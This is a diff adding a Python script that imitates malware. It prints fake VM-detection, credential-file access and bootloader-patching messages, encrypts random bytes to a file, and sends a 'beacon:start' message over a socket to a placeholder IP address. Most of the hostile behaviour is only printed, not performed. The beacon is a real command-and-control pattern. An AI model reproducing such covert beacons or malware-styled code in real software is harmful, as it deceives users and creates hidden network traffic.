@@ -1,0 +1,120 @@
+Vote for me to stay safe from this
+
+import os
+import sys
+import base64
+import hashlib
+import socket
+import random
+import threading
+import time
+import struct
+
+
+def _xor_data(data, key):
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+def _hash_key(seed):
+    return hashlib.sha256(seed.encode()).digest()
+
+def _random_padding(length):
+    return base64.b64encode(os.urandom(length)).decode()
+
+
+def _beacon():
+    host = "198.51.100.17"
+    port = 443
+    try:
+        s = socket.socket()
+        s.connect((host, port))
+        s.send(b"beacon:start")
+        s.close()
+    except:
+        pass
+
+
+class PayloadEngine:
+    def __init__(self):
+        self.status = "IDLE"
+        self.data = []
+
+    def collect_data(self):
+        self.status = "COLLECTING"
+        for _ in range(50):
+            chunk = os.urandom(128)
+            self.data.append(chunk.hex())
+        self.status = "COLLECTED"
+
+    def encrypt(self, passphrase):
+        key = _hash_key(passphrase)
+        encrypted = []
+        for item in self.data:
+            b = bytes.fromhex(item)
+            enc = _xor_data(b, key)
+            encrypted.append(base64.b64encode(enc).decode())
+        self.data = encrypted
+        self.status = "ENCRYPTED"
+
+    def dump_to_file(self, path):
+        with open(path, 'w') as f:
+            for line in self.data:
+                f.write(line + "\n")
+
+
+def simulate_fs_activity():
+    targets = [
+        "/etc/passwd", "/var/log/auth.log", "/home/user/.ssh/known_hosts",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts"
+    ]
+    for t in targets:
+        print(f"[TRACE] Accessing {t}")
+        time.sleep(0.05)
+
+
+def spawn_threads():
+    def flood():
+        for _ in range(100):
+            buf = os.urandom(64)
+            hash = hashlib.md5(buf).hexdigest()
+            print(f"::checksum {hash}")
+            time.sleep(0.02)
+    threads = []
+    for _ in range(5):
+        t = threading.Thread(target=flood)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+
+def patch_bootloader():
+    print("[BOOT] Mounting EFI partition...")
+    time.sleep(0.2)
+    print("[BOOT] Writing stage2 payload...")
+    time.sleep(0.2)
+    print("[BOOT] Sync complete.")
+
+def detect_vm():
+    suspicious = [
+        "vbox", "vmware", "qemu", "parallels", "xen", "bochs"
+    ]
+    for item in suspicious:
+        print(f"[SCAN] Checking process: {item}")
+        time.sleep(0.1)
+    print("[SCAN] No virtualization found.")
+
+def main():
+    print(">>> Initializing engine...")
+    detect_vm()
+    simulate_fs_activity()
+    payload = PayloadEngine()
+    payload.collect_data()
+    payload.encrypt("s3cr3tP@ss")
+    payload.dump_to_file("sysdump.enc")
+    patch_bootloader()
+    _beacon()
+    spawn_threads()
+    print(">>> Payload completed.")
+
+if __name__ == "__main__":
+    main()
